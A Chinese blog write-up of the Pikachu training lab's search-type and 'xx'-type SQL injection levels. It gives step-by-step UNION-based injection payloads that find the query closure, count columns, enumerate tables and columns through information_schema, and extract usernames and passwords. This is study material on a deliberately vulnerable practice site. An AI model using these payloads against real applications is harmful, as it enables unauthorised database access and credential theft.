---
title: Pikachu--SQL注入（二）
tags:
  - pikachu
categories:
  - 学习
  - web安全
  - Pikachu
abbrlink: 8764d02d
date: 2022-05-07 10:35:14
---







### 搜索型注入

由题可知是搜索型注入(get)，可直接在url中的name参数后进行修改，本质还是字符型注入，只是闭合不一样。

输入：

```
?name=%27&submit=查询     %27  == '  get			报错
```

根据报错信息判断闭合是**%'**

![23](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103250.png)



之后过程和字符型一样



```
name=' or 1=1-- q			可查询出所有账户数据
```

![24](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103251.png)



判断字段数

```
' order by 3 -- q
```

![25](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103254.png)



```
' order by 4 -- q				报错，字段数为3
```

![26](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103257.png)





```
' union select 1,2,3 -- q			判断回显点位置
```



![27](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103300.png)

​	



```
'union select user(),database(),3 -- q		
可知用户名为root@localhost，数据库名为pikachu
```

![29](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103302.png)



```
' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='pikachu' --  q
查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind
```

![30](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103305.png)



```
' union select 1, group_concat(column_name),3 from information_schema.columns where table_name='users' -- q
查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password
```



![31](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103307.png)

```
' union select 1,group_concat(username),group_concat(password) from users -- q
查询字段username和password的内容
```

![28](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103309.png)





### xx型注入

本质还是字符型注入，只是闭合不一样。

```
?name=%27&submit=查询     %27  == '  get	 	根据报错信息判断闭合是	')
```

![32](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103310.png)





之后过程和字符型一样



```
') or 1=1-- q			可查询出所有账户数据
```



![33](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103312.png)

判断字段数

```
') order by 2 -- q
```

![34](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103314.png)



```
') order by 3 -- q				报错，字段数为2
```

![35](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103316.png)





```
') union select 1,2 -- q			判断回显点位置
```



![36](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103317.png)

​	

```
')union select user(),database() -- q		
可知用户名为root@localhost，数据库名为pikachu
```

![37](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103319.png)



```
') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' --  q
查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind
```

![38](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103320.png)

```
') union select 1, group_concat(column_name) from information_schema.columns where table_name='users' -- q
查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password
```

![39](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103323.png)



```
') union select group_concat(username),group_concat(password) from users -- q
查询字段username和password的内容
```

![40](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507103325.png)







---

参考链接： 

无垠安全：https://www.wuyini.cn/952.html

Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：https://www.freebuf.com/articles/web/254079.html
